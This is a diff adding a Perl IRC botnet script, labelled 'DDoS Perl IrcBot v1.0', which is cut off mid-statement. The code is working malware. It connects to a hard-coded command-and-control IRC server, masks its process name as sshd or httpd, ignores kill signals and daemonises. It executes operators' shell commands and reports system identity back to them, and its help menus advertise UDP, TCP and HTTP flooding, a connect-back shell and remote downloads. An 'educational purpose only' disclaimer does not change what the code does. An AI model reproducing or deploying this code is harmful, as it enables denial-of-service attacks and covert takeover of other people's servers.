@@ -1,0 +1,1629 @@
+#!/usr/bin/perl
+
+
+
+
+
+
+
+######################################################################################################################
+
+
+
+######################################################################################################################
+
+
+
+##  DDoS Perl IrcBot v1.0 / 2013 By vK                  ## [ Help ] ###########################################
+
+
+
+##      Stealth MultiFunctional IrcBot writen in Perl          #######################################################
+
+
+
+##        Teste on every system with PERL instlled             ##  !u @system                                       ##
+
+
+
+##                                                             ##  !u @version                                      ##
+
+
+
+##     This is a free program used on your own risk.           ##  !u @channel                                      ##
+
+
+
+##        Created for educational purpose only.                ##  !u @flood                                        ##
+
+
+
+## I'm not responsible for the illegal use of this program.    ##  !u @utils                                        ##
+
+
+
+######################################################################################################################
+
+
+
+## [ Channel ] #################### [ Flood ] ################################## [ Utils ] ###########################
+
+
+
+######################################################################################################################
+
+
+
+##  !u @join <#channel>	     ##  !u @udp1 <ip> <port> <time>              ##  !u @cback <ip> <port>             ##
+
+
+
+##  !u @part <#channel>          ##  !u @udp2 <ip> <packet size> <time>       ##  !u @downlod <url+path> <file>     ##
+
+
+
+##  !u !uejoin <#channel>        ##  !u @udp3 <ip> <port> <time>              ##  !u @portscan <ip>                 ##
+
+
+
+##  !u !op <channel> <nick>      ##  !u @tcp <ip> <port> <packet size> <time> ##  !u @mail <subject> <sender>       ##
+
+
+
+##  !u !deop <channel> <nick>    ##  !u @http <site> <time>                   ##           <recipient> <message>    ##
+
+
+
+##  !u !voice <channel> <nick>   ##                                           ##  !u pwd;uname -a;id <for example>  ##
+
+
+
+##  !u !devoice <channel> <nick> ##  !u @ctcpflood <nick>                     ##  !u @port <ip> <port>              ##
+
+
+
+##  !u !nick <newnick>           ##  !u @msgflood <nick>                      ##  !u @dns <ip/host>                 ##
+
+
+
+##  !u !msg <nick>               ##  !u @noticeflood <nick>                   ##                                    ##
+
+
+
+##  !u !quit                     ##                                           ##                                    ##
+
+
+
+##  !u !uaw                      ##                                           ##                                    ##
+
+
+
+##  !u @die                      ##                                           ##                                    ##
+
+
+
+##                               ##                                           ##                                    ##
+
+
+
+######################################################################################################################
+
+
+
+######################################################################################################################
+
+
+
+
+
+
+
+#############################
+
+
+
+##### [ Configuration ] #####
+
+
+
+#############################
+
+
+
+
+
+
+
+my @rps = ("/usr/local/apache/bin/httpd -DSSL",
+
+
+
+		   "/usr/sbin/httpd -k start -DSSL",
+
+
+
+           "/usr/sbin/httpd",
+
+
+
+		   "/usr/sbin/sshd -i",
+
+
+
+		   "/usr/sbin/sshd",
+
+
+
+	       "/usr/sbin/sshd -D",
+
+
+
+           "/usr/sbin/apache2 -k start",
+
+
+
+	       "/sbin/syslogd",
+
+
+
+	       "/sbin/klogd -c 1 -x -x",
+
+
+
+		   "/usr/sbin/acpid",
+
+
+
+		   "/usr/sbin/cron");
+
+
+
+my $process = $rps[rand scalar @rps];
+
+
+
+
+
+
+
+my @rversion = ("\001VERSION - unknown command.\001",
+
+
+
+				"\001mIRC v5.91 K.Mardam-Bey\001",
+
+
+
+				"\001mIRC v6.2 Khaled Mardam-Bey\001",
+
+
+
+				"\001mIRC v6.03 Khaled Mardam-Bey\001",
+
+
+
+				"\001mIRC v6.14 Khaled Mardam-Bey\001",
+
+
+
+				"\001mIRC v6.15 Khaled Mardam-Bey\001",
+
+
+
+				"\001mIRC v6.16 Khaled Mardam-Bey\001",
+
+
+
+				"\001mIRC v6.17 Khaled Mardam-Bey\001",
+
+
+
+				"\001mIRC v6.21 Khaled Mardam-Bey\001",
+
+
+
+				"\001mIRC v6.31 Khaled Mardam-Bey\001",
+
+
+
+				"\001mIRC v7.15 Khaled Mardam-Bey\001");
+
+
+
+my $vers = $rversion[rand scalar @rversion];
+
+
+
+
+
+my @chars = ('a'..'z');
+my $len = 4;
+my $stringtt;
+while($len--){ $stringtt .= $chars[rand @chars] };
+
+
+my @rircname = "Lore".$stringtt;
+
+
+
+
+
+
+
+my $ircname = $rircname[rand scalar @rircname];
+
+
+
+
+
+
+
+## my @rrealname = ("4,1[ vK Security Team ]",
+
+
+
+## 				    "4,1 /!\ aloha Security Team /!\ ",
+
+
+
+##                  "2,1---=== 4,1 porno2,1===---");
+
+
+
+## chop (my $realname = $rrealname[rand scalar @rrealname]);
+
+
+
+
+
+
+
+chop (my $realname = $rircname[rand scalar @rircname]);
+
+
+
+
+
+
+
+## my @nickname = ("local");
+
+
+
+## my $nick =$nickname[rand scalar @nickname];
+
+
+
+
+
+
+
+my $nick =$rircname[rand scalar @rircname];
+
+
+
+
+
+
+
+$server = '5.135.181.68' unless $server;
+
+
+
+my $port = '6667';
+
+
+
+
+
+
+
+my $linas_max='8';
+
+
+
+my $sleep='5';
+
+
+
+
+
+
+
+my $homedir = "/tmp";
+
+
+
+my $version = 'By PruncuTz';
+
+
+
+
+
+
+
+my @admins = ("Alex","Doru");
+
+
+
+my @hostauth = ("hacked","Doru.HK");
+
+
+
+my @channels = ("#|PruncuTz");
+
+
+
+
+
+
+
+my $pacotes = 1;
+
+
+
+
+
+
+
+#################################################################
+
+
+
+##### [ Stop Editing if you dont know what are you doing. ] #####
+
+
+
+#################################################################
+
+
+
+
+
+
+
+$SIG{'INT'} = 'IGNORE';
+
+
+
+$SIG{'HUP'} = 'IGNORE';
+
+
+
+$SIG{'TERM'} = 'IGNORE';
+
+
+
+$SIG{'CHLD'} = 'IGNORE';
+
+
+
+$SIG{'PS'} = 'IGNORE';
+
+
+
+
+
+
+
+use Socket;
+
+
+
+use IO::Socket;
+
+
+
+use IO::Socket::INET;
+
+
+
+use IO::Select;
+
+
+
+
+
+
+
+chdir("$homedir");
+
+
+
+
+
+
+
+$server="$ARGV[0]" if $ARGV[0];
+
+
+
+$0="$process"."\0"x16;;
+
+
+
+my $pid=fork;
+
+
+
+exit if $pid;
+
+
+
+die "Can't fork in background: $!" unless defined($pid);
+
+
+
+
+
+
+
+our %irc_servers;
+
+
+
+our %DCC;
+
+
+
+my $dcc_sel = new IO::Select->new();
+
+
+
+$sel_cliente = IO::Select->new();
+
+
+
+sub sendraw {
+
+
+
+  if ($#_ == '1') {
+
+
+
+    my $socket = $_[0];
+
+
+
+    print $socket "$_[1]\n";
+
+
+
+  } else {
+
+
+
+    print $IRC_cur_socket "$_[0]\n";
+
+
+
+  }
+
+
+
+}
+
+
+
+
+
+
+
+sub getstore ($$)
+
+
+
+{
+
+
+
+  my $url = shift;
+
+
+
+  my $file = shift;
+
+
+
+  $http_stream_out = 1;
+
+
+
+  open(GET_OUTFILE, "> $file");
+
+
+
+  %http_loop_check = ();
+
+
+
+  _get($url);
+
+
+
+  close GET_OUTFILE;
+
+
+
+  return $main::http_get_result;
+
+
+
+}
+
+
+
+
+
+
+
+sub _get
+
+
+
+{
+
+
+
+  my $url = shift;
+
+
+
+  my $proxy = "";
+
+
+
+  grep {(lc($_) eq "http_proxy") && ($proxy = $ENV{$_})} keys %ENV;
+
+
+
+  if (($proxy eq "") && $url =~ m,^http://([^/:]+)(?::(\d+))?(/\S*)?$,) {
+
+
+
+    my $host = $1;
+
+
+
+    my $port = $2 || 80;
+
+
+
+    my $path = $3;
+
+
+
+    $path = "/" unless defined($path);
+
+
+
+    return _trivial_http_get($host, $port, $path);
+
+
+
+  } elsif ($proxy =~ m,^http://([^/:]+):(\d+)(/\S*)?$,) {
+
+
+
+    my $host = $1;
+
+
+
+    my $port = $2;
+
+
+
+    my $path = $url;
+
+
+
+    return _trivial_http_get($host, $port, $path);
+
+
+
+  } else {
+
+
+
+    return undef;
+
+
+
+  }
+
+
+
+}
+
+
+
+
+
+
+
+
+
+
+
+sub _trivial_http_get
+
+
+
+{
+
+
+
+  my($host, $port, $path) = @_;
+
+
+
+  my($AGENT, $VERSION, $p);
+
+
+
+  $AGENT = "get-minimal";
+
+
+
+  $VERSION = "20000118";
+
+
+
+  $path =~ s/ /%20/g;
+
+
+
+
+
+
+
+  require IO::Socket;
+
+
+
+  local($^W) = 0;
+
+
+
+  my $sock = IO::Socket::INET->new(PeerAddr => $host,
+
+
+
+                                   PeerPort => $port,
+
+
+
+                                   Proto   => 'tcp',
+
+
+
+                                   Timeout  => 60) || return;
+
+
+
+  $sock->autoflush;
+
+
+
+  my $netloc = $host;
+
+
+
+  $netloc .= ":$port" if $port != 80;
+
+
+
+  my $request = "GET $path HTTP/1.0\015\012"
+
+
+
+              . "Host: $netloc\015\012"
+
+
+
+              . "User-Agent: $AGENT/$VERSION/u\015\012";
+
+
+
+  $request .= "Pragma: no-cache\015\012" if ($main::http_no_cache);
+
+
+
+  $request .= "\015\012";
+
+
+
+  print $sock $request;
+
+
+
+
+
+
+
+  my $buf = "";
+
+
+
+  my $n;
+
+
+
+  my $b1 = "";
+
+
+
+  while ($n = sysread($sock, $buf, 8*1024, length($buf))) {
+
+
+
+    if ($b1 eq "") {
+
+
+
+      $b1 = $buf;
+
+
+
+      $buf =~ s/.+?\015?\012\015?\012//s;
+
+
+
+    }
+
+
+
+    if ($http_stream_out) { print GET_OUTFILE $buf; $buf = ""; }
+
+
+
+  }
+
+
+
+  return undef unless defined($n);
+
+
+
+  $main::http_get_result = 200;
+
+
+
+  if ($b1 =~ m,^HTTP/\d+\.\d+\s+(\d+)[^\012]*\012,) {
+
+
+
+    $main::http_get_result = $1;
+
+
+
+    if ($main::http_get_result =~ /^30[1237]/ && $b1 =~ /\012Location:\s*(\S+)/) {
+
+
+
+      my $url = $1;
+
+
+
+      return undef if $http_loop_check{$url}++;
+
+
+
+      return _get($url);
+
+
+
+    }
+
+
+
+    return undef unless $main::http_get_result =~ /^2/;
+
+
+
+  }
+
+
+
+
+
+
+
+  return $buf;
+
+
+
+}
+
+
+
+
+
+
+
+sub conectar {
+
+
+
+  my $meunick = $_[0];
+
+
+
+  my $server_con = $_[1];
+
+
+
+  my $port_con = $_[2];
+
+
+
+  my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$server_con",
+
+
+
+  PeerPort=>$port_con) or return(1);
+
+
+
+  if (defined($IRC_socket)) {
+
+
+
+    $IRC_cur_socket = $IRC_socket;
+
+
+
+    $IRC_socket->autoflush(1);
+
+
+
+    $sel_cliente->add($IRC_socket);
+
+
+
+    $irc_servers{$IRC_cur_socket}{'host'} = "$server_con";
+
+
+
+    $irc_servers{$IRC_cur_socket}{'port'} = "$port_con";
+
+
+
+    $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
+
+
+
+    $irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;
+
+
+
+    nick("$meunick");
+
+
+
+    sendraw("USER $ircname ".$IRC_socket->sockhost." $server_con :$realname");
+
+
+
+    sleep 1;
+
+
+
+  }
+
+
+
+}
+
+
+
+
+
+
+
+my $line_temp;
+
+
+
+while( 1 ) {
+
+
+
+  while (!(keys(%irc_servers))) { conectar("$nick", "$server", "$port"); }
+
+
+
+  delete($irc_servers{''}) if (defined($irc_servers{''}));
+
+
+
+  my @ready = $sel_cliente->can_read(0);
+
+
+
+  next unless(@ready);
+
+
+
+  foreach $fh (@ready) {
+
+
+
+    $IRC_cur_socket = $fh;
+
+
+
+    $meunick = $irc_servers{$IRC_cur_socket}{'nick'};
+
+
+
+    $nread = sysread($fh, $msg, 4096);
+
+
+
+    if ($nread == 0) {
+
+
+
+      $sel_cliente->remove($fh);
+
+
+
+      $fh->close;
+
+
+
+      delete($irc_servers{$fh});
+
+
+
+    }
+
+
+
+    @lines = split (/\n/, $msg);
+
+
+
+    for(my $c=0; $c<= $#lines; $c++) {
+
+
+
+      $line = $lines[$c];
+
+
+
+      $line=$line_temp.$line if ($line_temp);
+
+
+
+      $line_temp='';
+
+
+
+      $line =~ s/\r$//;
+
+
+
+      unless ($c == $#lines) {
+
+
+
+        parse("$line");
+
+
+
+        } else {
+
+
+
+        if ($#lines == 0) {
+
+
+
+          parse("$line");
+
+
+
+          } elsif ($lines[$c] =~ /\r$/) {
+
+
+
+          parse("$line");
+
+
+
+          } elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
+
+
+
+          parse("$line"); 
+
+
+
+        } else {
+
+
+
+      $line_temp = $line;
+
+
+
+        }
+
+
+
+      }
+
+
+
+    }
+
+
+
+  }
+
+
+
+}
+
+
+
+
+
+
+
+sub parse {
+
+
+
+  my $servarg = shift;
+
+
+
+  if ($servarg =~ /^PING \:(.*)/) {
+
+
+
+    sendraw("PONG :$1");
+
+
+
+    } elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
+
+
+
+    my $pn=$1; my $hostmask= $3; my $onde = $4; my $args = $5;
+
+
+
+    if ($args =~ /^\001VERSION\001$/) {
+
+
+
+      	 notice("$pn", "".$vers."");
+
+
+
+    }
+
+
+
+	if (grep {$_ =~ /^\Q$hostmask\E$/i } @hostauth) {
+
+
+
+    if (grep {$_ =~ /^\Q$pn\E$/i } @admins ) {
+
+
+
+    if ($onde eq "$meunick"){
+
+
+
+    shell("$pn", "$args");
+
+
+
+  }
+
+
+
+  if ($args =~ /^(\Q$meunick\E|\!u)\s+(.*)/ ) {
+
+
+
+    my $natrix = $1;
+
+
+
+    my $arg = $2;
+
+
+
+    if ($arg =~ /^\!(.*)/) {
+
+
+
+      ircase("$pn","$onde","$1");
+
+
+
+      } elsif ($arg =~ /^\@(.*)/) {
+
+
+
+      $ondep = $onde;
+
+
+
+      $ondep = $pn if $onde eq $meunick;
+
+
+
+      bfunc("$ondep","$1");
+
+
+
+      } else {
+
+
+
+      shell("$onde", "$arg");
+
+
+
+    }
+
+
+
+  }
+
+
+
+}
+
+
+
+}
+
+
+
+}
+
+
+
+
+
+
+
+elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
+
+
+
+  if (lc($1) eq lc($meunick)) {
+
+
+
+  $meunick=$4;
+
+
+
+  $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
+
+
+
+  }
+
+
+
+  } elsif ($servarg =~ m/^\:(.+?)\s+433/i) {
+
+
+
+  nick("$meunick-".int rand(9999));
+
+
+
+  } elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
+
+
+
+  $meunick = $2;
+
+
+
+  $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
+
+
+
+  $irc_servers{$IRC_cur_socket}{'nome'} = "$1";
+
+
+
+  foreach my $canal (@channels) {
+
+
+
+	sendraw("MODE $nick +x");
+
+
+
+    sendraw("JOIN $canal");
+
+
+
+	sendraw("PRIVMSG $canal :4,1 [vK Perl Bot] 9Salut vK'");
+
+
+
+}
+
+
+
+}
+
+
+
+}
+
+
+
+
+
+
+
+sub bfunc {
+
+
+
+my $printl = $_[0];
+
+
+
+my $funcarg = $_[1];
+
+
+
+  if (my $pid = fork) {
+
+
+
+  waitpid($pid, 0);
+
+
+
+  } else {
+
+
+
+  if (fork) {
+
+
+
+  exit;
+
+
+
+  } else {
+
+
+
+###########################
+
+
+
+##### [ Help Module ] #####
+
+
+
+###########################
+
+
+
+
+
+
+
+if ($funcarg =~ /^help/) {
+
+
+
+	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1======================= ");
+
+
+
+	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1PlTBuLL PerlBot Main Help:  ");
+
+
+
+	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1======================= ");
+
+
+
+	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1system              ");
+
+
+
+	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1version             ");
+
+
+
+	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1channel             ");	
+
+
+
+	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1flood               ");
+
+
+
+	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1utils               ");	
+
+
+
+	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1======================= ");
+
+
+
+}
+
+
+
+
+
+
+
+if ($funcarg =~ /^system/) {
+
+
+
+	$uptime=`uptime`;
+
+
+
+	$ownd=`pwd`; 
+
+
+
+	$id=`id`;
+
+
+
+	$uname=`uname -srp`;
+
+
+
+	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [System] 9,1=================== ");
+
+
+
+	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [System] 9,1Bot Configuration:  ");
+
+
+
+	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [System] 9,1=================== ");
+
+
+
+	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [System] 9,1*Server       : 12$server ");	
+
+
+
+	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [System] 9,1*Port         : 12$port ");
+
+
+
+	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [System] 9,1*Channels     : 12@channels ");
+
+
+
+	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [System] 9,1*uname -a     : 12$uname ");
+
+
+
+	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [System] 9,1*uptime       : 12$uptime ");
+
+
+
+	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [System] 9,1*FakeProcess  : 12$process ");
+
+
+
+	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [System] 9,1*ProcessPID   : 12$$ ");
+
+
+
+	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [System] 9,1*ID           : 12$id ");
+
+
+
+	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [System] 9,1*Own Dir      : 12$ownd ");
+
+
+
+	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [System] 9,1=================== ");
+
+
+
+}
+
+
+
+
+
+
+
+if ($funcarg =~ /^version/){
+
+
+
+	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Version] 9,1================================== ");
+
+
+
+	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Version] 9,1Bot Informations:                  ");
+
+
+
+	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Version] 9,1================================== ");
+
+
+
+	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Version] 9,1*Bot Version : 12$version   ");
+
+
+
+	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Version] 9,1*Bot Creator : 12DDoS             ");
+
+
+
+	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Version] 9,1*Bot Year    : 122012                ");
+
+
+
+	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Version] 9,1================================== ");
+
+
+
+}
+
+
+
+
+
+
+
+if ($funcarg =~ /^flood/) {
+
+
+
+	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1========================================= ");
+
+
+
+	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1PlTBuLL PerlBot Flood Help: ");
+
+
+
+	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1========================================= ");
+
+
+
+	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1udp1 <ip> <port> <time>               ");
+
+
+
+	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1udp2 <ip> <packet size> <time>        ");
+
+
+
+	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1udp3 <ip> <port> <time>               ");
+
+
+
+	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1tcp <ip> <port> <packet size> <time>  ");
+
+
+
+	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1http <site> <time>                    ");
+
+
+
+	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1ctcpflood <nick>                      ");
+
+
+
+	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1msgflood <nick>                       ");
+
+
+
+	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1noticeflood <nick>                    ");
+
+
+
+	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1========================================= ");
+
+
+
+}
+
+
+
+
+
+
+
+if ($funcarg =~ /^channel/) {
+
+
+
+	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1============================= ");
+
+
+
+	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1PlTBuLL PerlBot Channel Help:     ");
+
+
+
+	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1============================= ");
+
+
+
+	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1join <channel>            ");
+
+
+
+	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1part <channel>            ");
+
+
+
+	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12!9,1rejoin <channel>          ");
+
+
+
+	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12!9,1op <channel> <nick>       ");
+
+
+
+	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12!9,1deop <channel> <nick>     ");	
+
+
+
+	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12!9,1voice <channel> <nick>    ");
+
+
+
+	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12!9,1devoice <channel> <nick>  ");
+
+
+
+	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12!9,1nick <newnick>            ");
+
+
+
+	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12!9,1msg <nick>                ");
+
+
+
+	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12!9,1quit                      ");	
+
+
+
+	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12!9,1die                       ");
+
+
+
+	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1============================= ");
+
+
+
+}
+
+
+
+
+
+
+
+if ($funca
